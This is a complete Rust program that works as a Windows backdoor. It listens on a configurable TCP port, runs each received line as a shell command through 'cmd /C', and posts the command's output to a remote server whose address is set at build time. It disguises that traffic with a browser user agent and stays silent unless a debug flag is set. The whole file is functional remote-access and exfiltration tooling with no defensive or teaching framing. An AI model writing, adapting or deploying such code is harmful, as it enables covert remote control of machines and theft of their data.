#![allow(unused_unsafe)]
#![allow(unused_imports)]
use std::error::Error as CustError;
use std::io::{Error, ErrorKind, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
#[cfg(unix)]
use std::os::unix::io::AsRawFd;
#[cfg(windows)]
use std::os::windows::io::{AsRawSocket, RawSocket};
use std::process::Command;
//use std::str::FromStr;
use std::thread;
use std::time::Duration;

const BUFFER_SIZE: usize = 4096;

fn set_socket_options(stream: &TcpStream) -> std::io::Result<()> {
    stream.set_read_timeout(Some(Duration::from_secs(300)))?;
    stream.set_nodelay(true)?;

    #[cfg(windows)]
    {
        // Windows-specific socket options if needed
        unsafe {
            let _socket = stream.as_raw_socket();
            // Add Windows-specific socket options here if needed
            // For example, you might want to set SO_REUSEADDR
            // winapi::um::winsock2::setsockopt(...);
        }
    }

    Ok(())
}

fn handle_client(mut stream: TcpStream) {
    if let Err(e) = set_socket_options(&stream) {
        if env!("DEBUG") == "true" {
            println!("Failed to set socket options: {}", e);
        }
        return;
    }

    let peer_addr = stream.peer_addr().unwrap_or_else(|_| {
        std::net::SocketAddr::new(std::net::IpAddr::V4(std::net::Ipv4Addr::new(0, 0, 0, 0)), 0)
    });

    let mut buffer = vec![0; BUFFER_SIZE];
    let mut incomplete_data = Vec::new();

    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                if env!("DEBUG") == "true" {
                    println!("Connection closed by {}", peer_addr);
                }
                break;
            }
            Ok(n) => {
                incomplete_data.extend_from_slice(&buffer[..n]);

                while let Some(message) = process_message(&mut incomplete_data) {
                    match stream.write_all(&message) {
                        Ok(_) => {
                            if let Err(e) = stream.flush() {
                                if env!("DEBUG") == "true" {
                                    println!("Failed to flush stream for {}: {}", peer_addr, e);
                                }
                                return;
                            }
                        }
                        Err(e) => {
                            if env!("DEBUG") == "true" {
                                println!("Failed to write to {}: {}", peer_addr, e);
                            }
                            return;
                        }
                    }
                }
            }
            Err(e) => match e.kind() {
                ErrorKind::WouldBlock | ErrorKind::TimedOut => {
                    thread::sleep(Duration::from_millis(10));
                    continue;
                }
                ErrorKind::ConnectionReset | ErrorKind::ConnectionAborted => {
                    if env!("DEBUG") == "true" {
                        println!("Connection reset or aborted for {}", peer_addr);
                    }
                    break;
                }
                _ => {
                    if env!("DEBUG") == "true" {
                        println!("Error reading from {}: {}", peer_addr, e);
                    }
                    break;
                }
            },
        }
    }

    // Gracefully shutdown the connection
    let _ = stream.shutdown(Shutdown::Both);
}

use reqwest::blocking::Client;
use reqwest::header::USER_AGENT;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE};
fn construct_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, HeaderValue::from_bytes(b"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36").unwrap());
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("text/plain"));
    return headers;
}

fn send_post_request(body: &str) -> Result<String, Box<dyn CustError>> {
    let client = Client::new();
    let url = [
        env!("REMOTEPROTOCOL"),
        env!("REMOTEURL"),
        env!("REMOTEPATH"),
    ]
    .join("");

    let response = client
        .post(url)
        .headers(construct_headers())
        .body(body.to_string())
        .send()?;

    if response.status().is_success() {
        if env!("DEBUG") == "true" {
            println!("Envoi réussi! Statut: {}", response.status());
        }
        Ok(response.text()?)
    } else {
        Err(format!("Erreur HTTP: {}", response.status()))?
    }
}

fn process_message(data: &mut Vec<u8>) -> Option<Vec<u8>> {
    if let Some(pos) = data.iter().position(|&x| x == b'\n') {
        let message = data.drain(..=pos).collect::<Vec<_>>();

        match std::str::from_utf8(&message) {
            Ok(s) => {
                if env!("DEBUG") == "true" {
                    println!("As string: {}", s);
                }
                let output = Command::new("cmd")
                    .args(["/C", s])
                    .output()
                    .expect("failed to execute process");
                if env!("DEBUG") == "true" {
                    println!("status: {}", &output.status);
                    println!("out: {:?}", &output.stdout);
                    println!("err: {:?}", &output.stderr);
                }
                //let message = "Voici mes données à envoyer";

                let mut stdout: String = "".to_string();
                let mut stderr: String = "".to_string();

                if output.stderr.len() > 0 {
                    stderr = String::from_utf8_lossy(&output.stderr).to_string();
                }

                if output.stdout.len() > 0 {
                    stdout = String::from_utf8_lossy(&output.stdout).to_string();
                }

                // Créer un message formaté avec stdout et stderr
                let message = format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr);

                match send_post_request(&message) {
                    Ok(response) => {
                        if env!("DEBUG") == "true" {
                            println!("Réponse du serveur: {}", response);
                        }
                    }
                    Err(e) => {
                        if env!("DEBUG") == "true" {
                            eprintln!("Erreur lors de l'envoi: {}", e);
                        }
                    }
                }
                // io::stdout().write_all(&output.stdout).unwrap();
                // io::stderr().write_all(&output.stderr).unwrap();
            }
            Err(_) => {
                if env!("DEBUG") == "true" {
                    println!("Data is not valid UTF-8")
                }
            }
        }

        //println!("{}", std::str::from_utf8(&message));
        Some(message)
    } else {
        None
    }
}

fn create_listener() -> std::io::Result<TcpListener> {
    let listen_addr = [env!("LISTENINTERFACE"), env!("LISTENPORT")].join(":");
    let listener = TcpListener::bind(listen_addr)?;
    listener.set_nonblocking(true)?;
    Ok(listener)
}

fn main() -> Result<(), Error> {
    // Try to create the listener with error handling
    let listener = match create_listener() {
        Ok(l) => l,
        Err(e) => {
            if env!("DEBUG") == "true" {
                eprintln!("Failed to create listener: {}", e);
                if cfg!(windows) && e.kind() == ErrorKind::PermissionDenied {
                    eprintln!(
                        "Please run the program as administrator or use a port number > 1024."
                    );
                }
            }
            return Err(e);
        }
    };

    loop {
        match listener.accept() {
            Ok((stream, addr)) => {
                if env!("DEBUG") == "true" {
                    println!("New connection: {}", addr);
                }
                thread::spawn(move || {
                    handle_client(stream);
                });
            }
            Err(e) => {
                match e.kind() {
                    ErrorKind::WouldBlock => {
                        // On Windows, we need a small sleep to prevent busy waiting
                        thread::sleep(Duration::from_millis(50));
                        continue;
                    }
                    ErrorKind::ConnectionReset | ErrorKind::ConnectionAborted => {
                        if env!("DEBUG") == "true" {
                            println!("Client connection was reset before it could be accepted");
                        }
                        continue;
                    }
                    _ => {
                        if env!("DEBUG") == "true" {
                            println!("Error accepting connection: {}", e);
                        }
                        // On Windows, some errors might require restarting the listener
                        if cfg!(windows) {
                            thread::sleep(Duration::from_secs(1));
                        }
                    }
                }
            }
        }
    }
}
